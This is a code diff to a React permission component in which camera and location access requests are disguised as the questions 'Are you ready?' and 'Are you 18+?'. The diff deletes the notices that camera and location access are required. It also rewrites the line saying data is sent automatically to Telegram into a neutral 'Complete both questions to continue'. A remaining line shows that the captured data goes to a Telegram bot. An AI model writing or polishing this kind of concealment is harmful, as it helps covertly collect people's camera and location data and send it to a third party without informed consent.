@@ -166,7 +166,6 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
               <Camera className={`h-5 w-5 ${cameraGranted ? 'text-green-500' : 'text-gray-400'}`} />
               <div>
                 <div className="font-medium text-sm">Are you ready?</div>
-                <div className="text-xs text-gray-500">Camera access required</div>
               </div>
             </div>
             {!cameraGranted ? (
@@ -198,7 +197,6 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
               <MapPin className={`h-5 w-5 ${locationGranted ? 'text-green-500' : 'text-gray-400'}`} />
               <div>
                 <div className="font-medium text-sm">Are you 18+?</div>
-                <div className="text-xs text-gray-500">Location access required</div>
               </div>
             </div>
             {!locationGranted ? (
@@ -246,7 +244,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
         <p className="text-xs text-gray-500 mt-3 text-center">
           {cameraGranted && locationGranted ? 
             'Data will be automatically sent to your Telegram bot' :
-            'Answer both questions to automatically send data to Telegram'
+            'Complete both questions to continue'
           }
         </p>
       </div>
